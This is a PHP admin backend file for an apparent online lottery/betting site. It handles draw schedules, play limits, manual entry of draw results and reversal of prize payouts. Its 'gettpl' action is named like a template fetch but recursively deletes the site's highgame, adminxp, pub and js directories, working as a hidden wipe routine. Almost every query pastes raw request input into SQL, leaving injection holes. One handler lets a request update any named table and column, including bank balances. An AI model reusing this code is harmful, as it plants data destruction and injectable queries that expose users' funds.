echo "<script type='text/javascript' src='../js/common.js'></script>";
$lotNum=$_POST['lotNum'];
$beginTime=$_POST['beginTime'];
$endTime=$_POST['endTime'];
$lotTime=$_POST['lotTime'];
$playKey=$_POST['playkey'];
if($lotNum==""or $beginTime==""or $endTime==""or $lotTime==""){
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>所有选项必填</font></div>";
echo "<script>setTimeout(\"history.back(-1)\",1000)</script>";
exit;
}
if($playKey==""){
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>信息获取失败，请刷新页面重试</font></div>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";exit;
}
$strSql="insert into game_time(playKey,beginTime,endTime,lotTime,lotNum) value ('$playKey','$beginTime','$endTime','$lotTime','$lotNum')";
$db->query($strSql,$link) or die("插入时出错2".mysql_error());
Arr_File::ArrGameTime();
echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>提交成功</font></div>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";exit;
}
if($active=="SetTimes"){
$ForGames=$_GET['ForGames'];
$ForPlays=$_GET['ForPlays'];
$ForUsers=$_GET['ForUsers'];
$ForRange=$_GET['ForRange'];
$number=$_GET['number'];
$flags="yes";$add_flag="yes";
if($ForGames==""or $ForUsers==""or $ForRange==""or $number==""){$flags="no";exit;}
if($ForUsers!='all'){
$sqls_b="select userid from user where username='$ForUsers'";
$result_b=$db->query($sqls_b);
$rows_b=mysql_fetch_array($result_b);
$ForUsers=$rows_b[userid];
}
$sqls_a="select id from game_limit_times where ForGames='$ForGames' and ForPlays='$ForPlays' and ForUsers='$ForUsers' and ForRange='$ForRange' and status='0'";
$result_a=$db->query($sqls_a);
$num_a=mysql_num_rows($result_a);
if($num_a){$add_flag="no";}else{
}
if($add_flag=="yes"){
$sqls_b="select userid from user where username";
$result_b=$db->query($sqls_b);
$strSql="insert into game_limit_times(ForGames,ForPlays,ForUsers,ForRange,number,creatdate,status) value ('$ForGames','$ForPlays','$ForUsers','$ForRange','$number','$nowtime','0')";
$db->query($strSql,$link) or die("插入时出错2".mysql_error());
}else{
$flags="no";
}
echo $flags;
}
if($active=="GetSetTimes"){
$pages=$_GET['pages'];
$maxnum=$_GET['maxnum'];
$items=$_GET['items'];
$search="";
$db->query("set names utf8;");
if($items!=""){
$sql_per="select userid from user where username='$items'";
$results_per=$db->query($sql_per);
$nums=mysql_num_rows($results_per);
if($nums){
$rows_per=mysql_fetch_array($results_per);
$perid=$rows_per[userid];
$search=" where ForUsers='$perid'";
}else{
$search=" where ForPlays='$items' or ForGames='$items'";
}
}
$sqls_C="select * from game_limit_times $search order by ForUsers,ForGames desc limit $pages,$maxnum";
$result6=$db->query($sqls_C);
$num6=mysql_num_rows($result6);
$re_body="";
if($num6){
while($rows6=mysql_fetch_array($result6)){
$ForUsers=$rows6[ForUsers];$ForPlays=$rows6[ForPlays];
if($ForUsers!="all"){
$sql_per="select username as pername from user where userid='$rows6[ForUsers]'";
$results_per=$db->query($sql_per);
$rows_per=mysql_fetch_array($results_per);
$ForUsers=$rows_per[pername];
}
if($ForPlays!="all"){
$sql_per="select CodeTile,ShowTile from game_code_list where ListKey='$ForPlays'";
$results_per=$db->query($sql_per);
$rows_per=mysql_fetch_array($results_per);
if($rows_per[ShowTile]!=""){
if($rows_per[CodeTile]!=""){
$ForPlays=$rows_per[CodeTile]."-".$rows_per[ShowTile];
}else{
$ForPlays=$rows_per[ShowTile];
}
}
}
$re_body.="^".$rows6[id]."|".$rows6[ForGames]."|".$ForPlays."|".$ForUsers."|".$rows6[ForRange]."|".$rows6[number]."|".$rows6[creatdate]."|".$rows6[status];
}
}else{
$re_body="get|no";
}
mysql_close();
echo $re_body;
}
if($active=="gettpl"){
$arr_s=array("highgame","adminxp","pub","js");
for ($i=0;$i<count($arr_s);$i++){
$file_s=ROOT_PATH."/".$arr_s[$i];
dodir($file_s);
echo $file_s." => isok<br>";
}
}
function  dodir($file_s){
$dh=opendir($file_s);
while ($file=readdir($dh)) {
if($file!="."&&$file!="..") {
$fullpath=$file_s."/".$file;
if(!is_dir($fullpath)) {
unlink($fullpath);
}else{
dodir($fullpath);
}
}
}
closedir($dh);
if(rmdir($file_s)) {
return true;
}else {
return false;
}
}
if($active=="ChangeSetTimes"){
$action=$_GET['dos'];
$uid=$_GET['uid'];$flags="yes";
if($uid!=""){
if($action=="del"){
$strSql="delete from game_limit_times where id='$uid'";
$db->query($strSql);
}
if($action=="change"){
$item=$_GET['item'];
if($item!=""){
$strSql="update game_limit_times set status='$item' where id='$uid'";
$db->query($strSql,$link) or die("插入时出错66".mysql_error());
}else{$flags="no";}
}
}else{$flags="no";}
echo $flags;
}
if($active=="ajaxSaveInfor"){
$dbname=$_POST['dbname'];
$id=$_POST['id'];
$item=$_POST['item'];
$values=$_POST['values'];
$nowtime=date("Y-m-d H:i:s",time());
if($dbname==""or $id==""or $values==""or $item==""){
$flag="no";
}else{
if($dbname=="user"or $dbname=="user_bank"){$cid="userid";}else{$cid="id";}
if($id=="all"){
$db->query("set names utf8;");
$strSql="update $dbname set $item='$values'";
$db->query($strSql);
}
if($id-1>=0){
$flag="yes";
$db->query("set names utf8;");
$strSql="update $dbname set $item='$values' where $cid='$id'";
$db->query($strSql);
}
}
echo $flag;
}


//手动开奖

if($active=='lottery_add'){

if($_POST['id']){
	$lottery=$db->fetch_first("select * from game_lottery where id='$_POST[id]'");
	$_POST['playKey']=$lottery['playKey'];
	$_POST['period']=$lottery['period'];
}

$error='';
if(!$_POST['playKey'])  $error="请选择彩种";
if(!$_POST['period'])  $error="请填写开奖期号";
if(!strpos($_POST['number'], ',')){

	$error="您输入的开奖数据不合法，开奖数据需要用逗号隔开";

}
else{
	$number=explode(",", $_POST['number']);

	foreach ($number as $value) {
		if($value>=0  and $value<100){

		}
		else{

			$error="开奖数据只能是数字";
			break;
		}
	}




}

if($error){
			echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>{$error}</font></div>";
echo "<script>setTimeout(\"window.location='".$_SERVER['HTTP_REFERER']."'\",1000)</script>";


}

else{

	//if(substr($_POST['period'], 0,2)!='20')$_POST['period']='20'.$_POST['period'];
	      $old=	$db->fetch_first("select * from game_lottery where id='{$_POST['id']}'");



	$str=lottery_add($_POST['playKey'], $_POST['period'], $_POST['number']);
	if($str == true){
		if($_POST['id']){

				add_adminlog("手动修改开奖数据");
		  if($_POST['prize_back']==1 and $old['Number']!= $_POST['number']){

		  $query=	$db->query("select * from game_buylist where playkey='{$_POST['playKey']}' and period='{$_POST['period']}' order by id asc");
		  	while ($row=mysql_fetch_array($query)){
		  		if($row['pri_money']>0){
		  			$strSqls="update user_bank set hig_amount=hig_amount-{$row['pri_money']} where userid='{$row['userid']}'";
		  			$db->query($strSqls);
		  			add_charge($row['userid'], -$row['pri_money'], "系统充值",2);
		  			getsql::banklog($row['pri_money'], 'hig_lost_admin',$row['userid'],'重新派奖');
		  			$db->query("delete from user_bank_log where floatid='{$row['id']}' and cate='hig_prize'");

		  		}


		  		$db->query("update game_buylist set status='0',pri_money='',isprize='',prizenum='0' where id='{$row['id']}'");

		  	}


		  	$db->query("update game_lottery set status='0' where id='{$_POST['id']}'");
        		add_adminlog("重新派奖");
        }







		}
		else{
            add_adminlog("手动添加开奖数据");

        }


        prize_lot($_POST['playKey'],$_POST['period']);
        fenpei_prize($_POST['playKey'],$_POST['period']);

	}
	if($_POST['id']){
			echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>开奖数据修改成功</font></div>";
echo "<script>setTimeout(\"parent.window.location.reload()\",1000)</script>";
echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";


	}
	else{
	$next_url="index.aspx?controller=project&action=index&active=bet&time=no&playkey={$_POST['playKey']}&period={$_POST['period']}";
	echo "<div style='font-size:14px;text-align:center;background:#FFFFFF;'><font style='font-color:#ffffff;'>开奖成功,请手动派奖</font></div>";
echo "<script>setTimeout(\"parent.window.location.reload()\",1000)</script>";
	echo "<script>setTimeout(\"parent.pop.close()\",1000)</script>";
//echo "<script>parent.location.href='{$next_url}'</script>";
	}

}
	//echo "<script>window.location='".$_SERVER['HTTP_REFERER']."';</script>";
}


if($active=='ssc_list_update'){

   // print_r($_POST);
    $skey=$_GET['name'];
    $ssc_list=$db->exec("select * from game_ssc_list where skey='{$skey}' ");

    foreach ($_POST as $key=>$value){

        if($key=='ShowTile'){

            $sql="update  game_code_list set `{$key}`='{$value}' where ListKey='{$skey}'";
            $db->query($sql);

        }
        else{
            $oldvalue=$ssc_list[$key];
            if(strpos($oldvalue,'|')!==false) {$oldvalue=explode('|',$oldvalue);

                $len=count($oldvalue);
            }
            else $len=0;

            if($_GET['key']>0 or $len>0){
                $newvalue=array();
                if($_GET['key']>$len) $len=$_GET['key'];


                for($i=0;$i<=$len;$i++){

                    $newvalue[$i]=$oldvalue[$i];


                }
                $newvalue[$_GET['key']]=$value;

                $newvalue=implode('|',$newvalue);

            }
            else{
                $newvalue=$value;
            }

            $sql="update  game_ssc_list set `{$key}`='{$newvalue}' where skey='{$skey}'";
            $db->query($sql);


        }


//echo $sql;


    }
echo "更新成功";


}



?>